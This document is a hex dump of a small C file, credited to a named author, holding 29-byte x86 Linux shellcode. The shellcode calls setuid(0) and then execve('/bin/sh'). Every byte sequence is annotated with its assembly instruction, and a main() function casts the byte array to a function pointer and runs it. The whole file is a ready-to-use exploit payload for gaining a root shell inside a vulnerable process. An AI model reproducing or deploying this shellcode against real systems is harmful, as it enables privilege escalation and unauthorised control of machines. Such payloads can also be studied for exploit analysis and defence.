00000000  2f 2a 20 32 39 20 62 79  74 65 2d 6c 6f 6e 67 20  |/* 29 byte-long |
00000010  73 65 74 75 69 64 28 30  29 20 2b 20 65 78 65 63  |setuid(0) + exec|
00000020  76 65 28 22 2f 62 69 6e  2f 73 68 22 2c 2e 2e 2e  |ve("/bin/sh",...|
00000030  29 20 73 68 65 6c 6c 63  6f 64 65 0d 0a 20 20 20  |) shellcode..   |
00000040  62 79 20 4d 61 72 63 69  6e 20 55 6c 69 6b 6f 77  |by Marcin Ulikow|
00000050  73 6b 69 20 3c 65 6c 63  65 65 66 40 69 74 73 65  |ski <elceef@itse|
00000060  63 2e 70 6c 3e 20 2a 2f  0d 0a 20 0d 0a 23 69 6e  |c.pl> */.. ..#in|
00000070  63 6c 75 64 65 20 3c 75  6e 69 73 74 64 2e 68 3e  |clude <unistd.h>|
00000080  0d 0a 20 0d 0a 63 68 61  72 20 73 68 65 6c 6c 63  |.. ..char shellc|
00000090  6f 64 65 5b 5d 20 3d 0d  0a 22 5c 78 33 31 5c 78  |ode[] =.."\x31\x|
000000a0  64 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |db"             |
000000b0  2f 2a 20 78 6f 72 20 20  20 20 25 65 62 78 2c 25  |/* xor    %ebx,%|
000000c0  65 62 78 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |ebx       */.."\|
000000d0  78 38 64 5c 78 34 33 5c  78 31 37 22 20 20 20 20  |x8d\x43\x17"    |
000000e0  20 20 20 20 20 2f 2a 20  6c 65 61 20 20 20 20 30  |     /* lea    0|
000000f0  78 31 37 28 25 65 62 78  29 2c 25 65 61 78 20 2a  |x17(%ebx),%eax *|
00000100  2f 0d 0a 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |/.."\xcd\x80"   |
00000110  20 20 20 20 20 20 20 20  20 20 2f 2a 20 69 6e 74  |          /* int|
00000120  20 20 20 20 24 30 78 38  30 20 20 20 20 20 20 20  |    $0x80       |
00000130  20 20 20 20 2a 2f 0d 0a  22 5c 78 35 33 22 20 20  |    */.."\x53"  |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000150  2a 20 70 75 73 68 20 20  20 25 65 62 78 20 20 20  |* push   %ebx   |
00000160  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |         */.."\x|
00000170  36 38 5c 78 36 65 5c 78  32 66 5c 78 37 33 5c 78  |68\x6e\x2f\x73\x|
00000180  36 38 22 20 2f 2a 20 70  75 73 68 20 20 20 24 30  |68" /* push   $0|
00000190  78 36 38 37 33 32 66 36  65 20 20 20 20 20 2a 2f  |x68732f6e     */|
000001a0  0d 0a 22 5c 78 36 38 5c  78 32 66 5c 78 32 66 5c  |.."\x68\x2f\x2f\|
000001b0  78 36 32 5c 78 36 39 22  20 2f 2a 20 70 75 73 68  |x62\x69" /* push|
000001c0  20 20 20 24 30 78 36 39  36 32 32 66 32 66 20 20  |   $0x69622f2f  |
000001d0  20 20 20 2a 2f 0d 0a 22  5c 78 38 39 5c 78 65 33  |   */.."\x89\xe3|
000001e0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |"             /*|
000001f0  20 6d 6f 76 20 20 20 20  25 65 73 70 2c 25 65 62  | mov    %esp,%eb|
00000200  78 20 20 20 20 20 20 20  2a 2f 0d 0a 22 5c 78 35  |x       */.."\x5|
00000210  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000220  20 20 20 2f 2a 20 70 75  73 68 20 20 20 25 65 61  |   /* push   %ea|
00000230  78 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |x            */.|
00000240  0a 22 5c 78 35 33 22 20  20 20 20 20 20 20 20 20  |."\x53"         |
00000250  20 20 20 20 20 20 20 20  2f 2a 20 70 75 73 68 20  |        /* push |
00000260  20 20 25 65 62 78 20 20  20 20 20 20 20 20 20 20  |  %ebx          |
00000270  20 20 2a 2f 0d 0a 22 5c  78 38 39 5c 78 65 31 22  |  */.."\x89\xe1"|
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000290  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 63 78  |mov    %esp,%ecx|
000002a0  20 20 20 20 20 20 20 2a  2f 0d 0a 22 5c 78 39 39  |       */.."\x99|
000002b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000002c0  20 20 2f 2a 20 63 6c 74  64 20 20 20 20 20 20 20  |  /* cltd       |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000002e0  22 5c 78 62 30 5c 78 30  62 22 20 20 20 20 20 20  |"\xb0\x0b"      |
000002f0  20 20 20 20 20 20 20 2f  2a 20 6d 6f 76 20 20 20  |       /* mov   |
00000300  20 24 30 78 62 2c 25 61  6c 20 20 20 20 20 20 20  | $0xb,%al       |
00000310  20 2a 2f 0d 0a 22 5c 78  63 64 5c 78 38 30 22 3b  | */.."\xcd\x80";|
00000320  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 69  |            /* i|
00000330  6e 74 20 20 20 20 24 30  78 38 30 20 20 20 20 20  |nt    $0x80     |
00000340  20 20 20 20 20 20 2a 2f  0d 0a 20 0d 0a 69 6e 74  |      */.. ..int|
00000350  20 6d 61 69 6e 28 76 6f  69 64 29 20 7b 0d 0a 20  | main(void) {.. |
00000360  20 76 6f 69 64 28 2a 66  29 28 29 3d 28 76 6f 69  | void(*f)()=(voi|
00000370  64 2a 29 73 68 65 6c 6c  63 6f 64 65 3b 66 28 29  |d*)shellcode;f()|
00000380  3b 0d 0a 20 20 72 65 74  75 72 6e 20 30 3b 0d 0a  |;..  return 0;..|
00000390  7d                                                |}|
00000391
